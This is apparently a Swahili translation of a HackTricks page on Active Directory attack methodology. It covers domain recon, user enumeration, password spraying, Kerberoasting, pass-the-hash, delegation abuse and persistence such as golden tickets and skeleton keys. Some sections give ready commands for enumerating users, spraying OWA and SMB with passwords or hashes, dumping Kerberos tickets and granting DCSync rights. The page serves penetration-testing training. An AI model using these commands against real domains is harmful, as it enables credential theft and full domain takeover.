# Mbinu za Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa Msingi

**Active Directory** ni teknolojia ya msingi inayomruhusu **wasimamizi wa mtandao** kuunda na kusimamia kwa ufanisi **domains**, **users**, na **objects** ndani ya mtandao. Imetengenezwa ili kustahimili ukuaji, ikiruhusu kupanga idadi kubwa ya watumiaji katika **groups** na **subgroups** zinazoweza kusimamiwa, huku ikidhibiti **access rights** kwa ngazi mbalimbali.

Muundo wa **Active Directory** una tabaka kuu tatu: **domains**, **trees**, na **forests**. **Domain** inajumuisha mkusanyiko wa objects, kama **users** au **devices**, wanaoshiriki database ya pamoja. **Trees** ni vikundi vya domains vinavyounganishwa kwa muundo wa pamoja, na **forest** ni mkusanyiko wa miti kadhaa zinazohusishwa kupitia **trust relationships**, zikifanya safu ya juu kabisa ya muundo wa shirika. Haki maalum za **access** na **communication** zinaweza kuwekwa katika kila moja ya ngazi hizi.

Madhumuni muhimu ndani ya **Active Directory** ni:

1. **Directory** – Inahifadhi taarifa zote zinazohusu Active Directory objects.
2. **Object** – Inaonyesha kiumbe ndani ya directory, ikijumuisha **users**, **groups**, au **shared folders**.
3. **Domain** – Inafanya kazi kama kontena la directory objects, na inawezekana kwa domains nyingi kuishi ndani ya **forest**, kila moja ikiwa na mkusanyiko wake wa objects.
4. **Tree** – Kikundi cha domains kinachoshiriki root domain moja.
5. **Forest** – Safu ya juu kabisa ya muundo wa shirika katika Active Directory, inayojumuisha miti kadhaa zikiwa na **trust relationships** baina yao.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi wa katikati na mawasiliano ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Inakusanya data kwa sehemu moja na kusimamia mwingiliano kati ya **users** na **domains**, ikiwa ni pamoja na **authentication** na **search**.
2. **Certificate Services** – Inasimamia uundaji, ugawaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Inaunga mkono programu zilizo na directory kwa kupitia **LDAP protocol**.
4. **Directory Federation Services** – Inatoa uwezo wa **single-sign-on** kuthibitisha watumiaji kwenye web applications mbalimbali kwa kikao kimoja.
5. **Rights Management** – Inasaidia kulinda nyenzo za hakimiliki kwa kudhibiti usambazaji na matumizi yasiyoidhinishwa.
6. **DNS Service** – Huduma muhimu kwa kutatua **domain names**.

Kwa maelezo zaidi angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD** unahitaji kuelewa vizuri mchakato wa **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kuangalia mengi kwenye [https://wadcoms.github.io/](https://wadcoms.github.io) ili kupata muhtasari wa haraka wa amri ambazo unaweza kutekeleza ku-enumerate/exploit AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** kwa kufanya vitendo. Ukijaribu kufikia mashine kwa anwani ya IP, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Kama una ufikiaji wa mazingira ya AD lakini huna credentials/sessions unaweza:

- **Pentest the network:**
- Piga skani mtandao, pata mashine na port zilizo wazi na jaribu **exploit vulnerabilities** au **extract credentials** kutoka kwao (kwa mfano, [printers could be very interesting targets](ad-information-in-printers.md)).
- Ku-orodha DNS kunaweza kutoa taarifa kuhusu server muhimu ndani ya domain kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Angalia [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) kwa maelezo zaidi juu ya jinsi ya kufanya haya.
- **Check for null and Guest access on smb services** (hii haitafanya kazi kwenye version za kisasa za Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina juu ya jinsi ya ku-enumerate SMB server unaweza kupatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina juu ya jinsi ya ku-enumerate LDAP unaweza kupatikana hapa (lipa **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Kusanya credentials kwa **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pata ufikiaji wa host kwa **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **exposing fake UPnP services with evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Chota usernames/majina kutoka kwa nyaraka za ndani, mitandao ya kijamii, huduma (hasa web) ndani ya mazingira ya domain na pia zile zilizopo hadharani.
- Ukipata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu aina tofauti za AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Mienendo ya kawaida ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila moja), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 _random_ na namba 3 _random_ (abc123).
- Zana:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Uorodheshaji wa watumiaji

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username is requested** server itajibu kwa kutumia msimbo wa hitilafu wa **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ikituruhusu kubaini kuwa username ilikuwa batili. **Valid usernames** zitatokea kwa AS-REP yenye **TGT** au hitilafu _KRB5KDC_ERR_PREAUTH_REQUIRED_, ikionyesha kuwa mtumiaji anahitajika kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya kiolesura cha MS-NRPC (Netlogon) kwenye domain controllers. Mbinu inaita function `DsrGetDcNameEx2` baada ya kufunga MS-NRPC interface ili kukagua kama user au computer ipo bila credentials. Zana ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) inatekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ikiwa umepata moja ya server hizi kwenye mtandao, unaweza pia kufanya **user enumeration against it**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Unaweza kupata orodha za majina ya watumiaji katika [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) na hii ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi kampuni** kutoka hatua ya recon uliopaswa kufanya kabla ya hii. Ukiwa na jina la kwanza na la mwisho unaweza kutumia script ya [**namemash.py**](https://gist.github.com/superkojiman/11076951) kuunda majina ya watumiaji yanayowezekana ya halali.

### Kujua jina la mtumiaji mmoja au kadhaa

Sawa, kwa hiyo unajua tayari una jina la mtumiaji halali lakini hakuna nywila... Kisha jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa mtumiaji **hana** sifa ya _DONT_REQ_PREAUTH_ unaweza **kuomba ujumbe wa AS_REP** kwa mtumiaji huyo ambao utaweka data iliyosenywa kwa mabadiliko ya nywila ya mtumiaji.
- [**Password Spraying**](password-spraying.md): Tujaribu nywila za **kawaida zaidi** kwa kila mtumiaji uliyekutwa, labda baadhi ya watumiaji wanatumia nywila mbaya (kumbuka sera ya nywila!).
- Kumbuka kwamba pia unaweza **kuspray OWA servers** ili kujaribu kupata ufikiaji wa server za barua za watumiaji.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Unaweza kupata baadhi ya challenge hashes za kukatwaza kwa ku-poison baadhi ya protocols za network:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umeweza kuorodhesha Active Directory utakuwa na barua pepe zaidi na uelewa bora wa network. Unaweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ili kupata ufikiaji wa mazingira ya AD.

### Steal NTLM Creds

Ikiwa unaweza **kupata ufikiaji wa PC au shares nyingine** kwa kutumia null au guest user unaweza **kuweka files** (kama SCF file) ambazo zikigusiwa zitafanya **NTLM authentication dhidi yako** ili uweze **kuiba** NTLM challenge na kuikata:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Kuorodhesha Active Directory NA credentials/session

Kwa awamu hii unahitaji kuwa umeingilia credentials au session ya akaunti halali ya domain. Ikiwa una credentials halali au shell kama mtumiaji wa domain, kumbuka kwamba chaguzi zilizotolewa hapo awali bado zinaweza kutumika kuingilia watumiaji wengine.

Kabla ya kuanza enumeration iliyothibitishwa unapaswa kujua nini ni Kerberos double hop problem.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Uorodheshaji

Kuwa umeingilia akaunti ni hatua kubwa ya kuanza kuingilia domain nzima, kwa sababu utaweza kuanza Active Directory Enumeration:

Kuhusiana na [**ASREPRoast**](asreproast.md) sasa unaweza kupata watumiaji wote wanaoweza kuwa dhaifu, na kuhusu [**Password Spraying**](password-spraying.md) unaweza kupata **orodha ya majina yote ya watumiaji** na kujaribu nywila ya akaunti iliyovamiwa, nywila tupu na nywila mpya zenye matumaini.

- Unaweza kutumia [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Unaweza pia kutumia [**powershell for recon**](../basic-powershell-for-pentesters/index.html) ambayo itakuwa isiyoonekana zaidi
- Pia unaweza [**use powerview**](../basic-powershell-for-pentesters/powerview.md) kupata taarifa za kina zaidi
- Zana nyingine nzuri ya recon katika Active Directory ni [**BloodHound**](bloodhound.md). Si **siri sana** (kutegemea mbinu za ukusanyaji unazotumia), lakini **ikiwa haujali** kuhusu hilo, inafaa kujaribu kabisa. Tafuta wapi watumiaji wanaweza RDP, pata njia za vikundi vingine, n.k.
- **Zana nyingine za otomatiki za uorodheshaji wa AD ni:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) kwani zinaweza kuwa na taarifa za kuvutia.
- Zana yenye GUI ambayo unaweza kutumia kuorodhesha directory ni **AdExplorer.exe** kutoka kwa **SysInternal** Suite.
- Pia unaweza kutafuta kwenye database ya LDAP kwa kutumia **ldapsearch** kutafuta credentials katika fields _userPassword_ & _unixUserPassword_, au hata kwa _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) kwa mbinu nyingine.
- Ikiwa unatumia **Linux**, unaweza pia kuorodhesha domain kwa kutumia [**pywerview**](https://github.com/the-useless-one/pywerview).
- Unaweza pia kujaribu zana za otomatiki kama:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Kuvua watumiaji wote wa domain**

Ni rahisi sana kupata majina yote ya watumiaji wa domain kutoka Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). Katika Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Hata kama sehemu hii ya Enumeration inaonekana ndogo hii ndilo sehemu muhimu zaidi ya yote. Fikia viungo (hasa ile ya cmd, powershell, powerview na BloodHound), jifunze jinsi ya kuorodhesha domain na fanya mazoezi hadi ujisikie uko tayari. Wakati wa assessment, hili litakuwa wakati muhimu wa kupata njia yako kuelekea DA au kuamua kwamba hakuna kinachoweza kufanywa.

### Kerberoast

Kerberoasting inahusisha kupata **TGS tickets** zinazotumiwa na services zinazohusishwa na akaunti za watumiaji na kuvunja usimbaji wake—ambao unategemea nywila za watumiaji—**offline**.

Taarifa zaidi hapa:


{{#ref}}
kerberoast.md
{{#endref}}

### Muunganisho wa mbali (RDP, SSH, FTP, Win-RM, etc)

Mara utaempata credentials fulani unaweza kuangalia kama una ufikiaji wa mashine yoyote. Kwa kufanya hivyo, unaweza kutumia CrackMapExec kujaribu kujiunga kwenye server nyingi kwa protokoli tofauti, kulingana na port scan zako.

### Local Privilege Escalation

Ikiwa umeingilia credentials au session kama mtumiaji wa kawaida wa domain na una **ufikiaji** kwa mtumiaji huyu kwenye mashine yoyote katika domain inapaswa kujaribu kupata njia ya kuinua privileges kwa ndani na kuchimba kwa credentials. Hii ni kwa sababu ni kwa privileges za local administrator tu utakapoweza **dump hashes** za watumiaji wengine katika memory (LSASS) na kwa ndani (SAM).

Kuna ukurasa kamili katika kitabu hiki kuhusu [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Ni **nadra sana** utapata **tickets** kwenye mtumiaji wa sasa zitakazokuongezea ruhusa ya kupata rasilimali usizotarajia, lakini unaweza kuangalia:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ikiwa umefanikiwa kuorodhesha Active Directory utakuwa na **barua pepe zaidi na uelewa bora wa mtandao**. Huenda ukaweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sasa kwa kuwa una baadhi ya credentials za msingi unapaswa kuangalia kama unaweza **kupata** faili zozote **zinazovutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo kwa mkono lakini ni kazi ya kuchosha na kurudia (na zaidi endapo utakuta mamia ya nyaraka unazopaswa kukagua).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza **kupata PC au shares nyingine** unaweza **kuweka faili** (k.m. SCF file) ambazo zikifunguliwa zita**lazimisha uthibitishaji wa NTLM dhidi yako** ili uweze **kuiba** **NTLM challenge** na kuijaribu kuvunja:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Udhaifu huu ulimruhusu mtumiaji yeyote aliyethibitishwa **kudhoofisha domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Kwa bahati nzuri umeweza **kupata udhibiti wa akaunti ya local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) ikiwemo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa kutupa hashes zote zilizo kwenye memory na ndani ya mashine.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara utakapokuwa na hash ya mtumiaji**, unaweza kuitumia kumfanyia **impersonate**.\
Unahitaji kutumia zana itakayofanya **uthibitishaji wa NTLM ukitumia** hash hiyo, **au** unaweza kuunda sessionlogon mpya na **kuingiza** hash hiyo ndani ya LSASS, ili wakati wowote **uthibitishaji wa NTLM unafanyika**, hash hiyo itatumika. Chaguo la mwisho ndiyo mimikatz inafanya.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulio hili linalenga **kutumia hash ya NTLM ya mtumiaji kuomba tiketi za Kerberos**, kama mbadala wa kawaida Pass The Hash juu ya protocol ya NTLM. Kwa hivyo, hili linaweza kuwa hasa **lenye matumizi kwenye mitandao ambapo protocol ya NTLM imezimwa** na **Kerberos pekee ndiyo inaruhusiwa** kama protocol ya uthibitishaji.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika njia ya shambulio ya **Pass The Ticket (PTT)**, wadukuzi **huiba tiketi ya uthibitishaji ya mtumiaji** badala ya nywila au thamani za hash. Tiketi hii iliyoporwa kisha inatumika **kuiga mtumiaji**, kupata ufikiaji usioidhinishwa kwa rasilimali na huduma ndani ya mtandao.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrator** unapaswa kujaribu **kuingia locally** kwenye **PC nyingine** ukitumia hiyo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba hii inasababisha **kelele nyingi** na **LAPS** ingepunguza hilo.

### MSSQL Abuse & Trusted Links

Iwapo mtumiaji ana ruhusa za **access MSSQL instances**, anaweza kuitumia kuweza **execute commands** kwenye mwenyeji wa MSSQL (ikiwa inaendesha kama SA), **steal** NetNTLM **hash** au hata kufanya **relay attack**.\
Pia, ikiwa MSSQL instance imewekwa kama trusted (database link) na instance tofauti ya MSSQL. Ikiwa mtumiaji ana ruhusa kwenye database iliyotumika, atakuwa na uwezo wa **use the trust relationship to execute queries also in the other instance**. Imani hizi zinaweza kuunganishwa mnyororo na kwa wakati fulani mtumiaji anaweza kupata database iliyopangwa vibaya ambako anaweza kuexecute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suite za upande wa tatu za inventory na deployment mara nyingi zinaonyesha njia zenye nguvu kuelekea credentials na code execution. Angalia:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ikiwa utakuta Computer object yoyote yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una domain privileges kwenye kompyuta hiyo, utaweza dump TGTs kutoka kwenye memory ya watumiaji wote wanao login kwenye kompyuta.\
Hivyo, ikiwa **Domain Admin logins onto the computer**, utaweza dump TGT yake na kuimpersonate kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Shukrani kwa constrained delegation unaweza hata **automatically compromise a Print Server** (kwa bahati nzuri itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa user au computer imekubaliwa kwa "Constrained Delegation" itakuwa na uwezo wa **impersonate any user to access some services in a computer**.\
Kisha, ikiwa utakapofanya **compromise the hash** ya user/computer hii utaweza **impersonate any user** (hata domain admins) kupata huduma fulani.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na ruhusa ya **WRITE** juu ya Active Directory object ya remote computer kunawawezesha kupata code execution kwa **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Mtumiaji aliyepatwa anaweza kuwa na baadhi ya **interesting privileges over some domain objects** ambazo zinaweza kuruhusu wewe **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Kugundua **Spool service listening** ndani ya domain kunaweza kutumika **abused** ili **acquire new credentials** na **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ikiwa **other users** **access** the **compromised** machine, inawezekana **gather credentials from memory** na hata **inject beacons in their processes** ili kuimpersonate.\
Kwa kawaida watumiaji watafikia mfumo kupitia RDP, kwa hiyo hapa kuna jinsi ya kufanya baadhi ya attacks juu ya third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** inatoa mfumo wa kusimamia **local Administrator password** kwenye kompyuta zinazounganishwa na domain, kuhakikisha kuwa imekuwa **randomized**, ya kipekee, na mara kwa mara **changed**. Password hizi zimehifadhiwa ndani ya Active Directory na ufikiaji unadhibitiwa kupitia ACLs kwa watumiaji walioruhusiwa pekee. Ukiwa na permissions za kutosha za kuaccess password hizi, pivoting kwenda kwenye kompyuta nyingine kunawezekana.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Kukusanya **certificates** kutoka kwa mashine iliyoporwa kunaweza kuwa njia ya kuescalate privileges ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ikiwa **vulnerable templates** zimesanidiwa inawezekana kuzitumia kwa **abuse** ili kuescalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Mara tu unapopata **Domain Admin** au bora zaidi **Enterprise Admin** privileges, unaweza **dump** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Baadhi ya techniques zilizojadiliwa hapo awali zinaweza kutumika kwa persistence.\
Kwa mfano unaweza:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** inaunda legitimate Ticket Granting Service (TGS) ticket kwa huduma maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya PC account**). Mbinu hii inatumiwa kupata service privileges.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** inahusisha mshambuliaji kupata **NTLM hash ya krbtgt account** ndani ya Active Directory (AD). Akaunti hii ni maalum kwa sababu inatumiwa kusaini lahat TGTs (Ticket Granting Tickets), ambazo ni muhimu kwa uthibitisho ndani ya mtandao wa AD.

Mara mshambuliaji anapopata hash hii, anaweza kuunda **TGTs** kwa akaunti yoyote anayotaka (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizofunguliwa kwa njia zinazoweza **bypass common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na certificates za akaunti au uwezo wa kuzi-request** ni njia nzuri ya kuweka persistence kwenye akaunti ya mtumiaji (hata kama anabadilisha password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Kutumia certificates pia inaruhusu persistence kwa privileges za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object katika Active Directory inahakikisha usalama wa **privileged groups** (kama Domain Admins na Enterprise Admins) kwa kutumia Access Control List (ACL) ya kawaida kwa vikundi hivi ili kuzuia mabadiliko yasiyoruhusiwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; ikiwa mshambuliaji atabadilisha ACL ya AdminSDHolder ili kumpa mtumiaji wa kawaida ufikiaji kamili, mtumiaji huyo atapata udhibiti mpana juu ya vikundi vyote vya privileged. Kipengele hiki cha usalama, kilichokusudiwa kuwalinda, kinaweza hivyo kuleta matokeo mabaya isipokuwa kinadhibitiwa kwa karibu.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Katikati ya kila **Domain Controller (DC)**, kuna akaunti ya **local administrator**. Kwa kupata admin rights kwenye mashine kama hiyo, hash ya local Administrator inaweza kuchukuliwa kwa kutumia **mimikatz**. Baadaye, marekebisho ya registry yanahitajika ili **enable the use of this password**, kuruhusu ufikiaji wa mbali kwa akaunti ya local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumpa** baadhi ya **special permissions** mtumiaji juu ya baadhi ya domain objects maalum ambazo zitamruhusu mtumiaji **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** hutumika **kuhifadhi** **permissions** ambazo **object** ina juu ya kitu fulani. Ikiwa unaweza kufanya tu **mabadiliko madogo** kwenye **security descriptor** ya object, unaweza kupata privileges za kuvutia juu ya object hiyo bila kuwa mwanachama wa kikundi chenye vibali.

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** kwenye memory ili kuanzisha **neno la siri la ulimwengu wote (universal password)**, likiruhusu ufikiaji wa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda SSP yako mwenyewe ili **capture** kwa **clear text** credentials zinazotumika kufikia mashine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Inarejesha kama **Domain Controller mpya** ndani ya AD na kulitumia kusukuma attributes (SIDHistory, SPNs...) kwa vitu vilivyotajwa **bila** kuacha **logs** kuhusu **modifications**. Unahitaji DA privileges na kuwa ndani ya **root domain**.\
Kumbuka kwamba ikiwa utatumia data zisizo sahihi, logs mbaya zitaonekana.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Hapo awali tumependekeza jinsi ya kuescalate privileges ikiwa una **permission za kutosha kusoma LAPS passwords**. Hata hivyo, password hizi pia zinaweza kutumika kuendelea kuwa na persistence.\
Angalia:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft inaona **Forest** kama mipaka ya usalama. Hii ina maana kwamba **kuharibu domain moja kunaweza kusababisha Forest nzima kuathiriwa**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni mfumo wa usalama unaomruhusu mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Kwa msingi huo inaunda uunganisho kati ya mifumo ya uthibitisho ya domain zote mbili, ikiruhusu uhakiki wa uthibitisho kuendelea kwa urahisi. Wakati domain zinapounda trust, zinabadilisha na kuhifadhi funguo maalum ndani ya **Domain Controllers (DCs)**, ambazo ni muhimu kwa uadilifu wa trust.

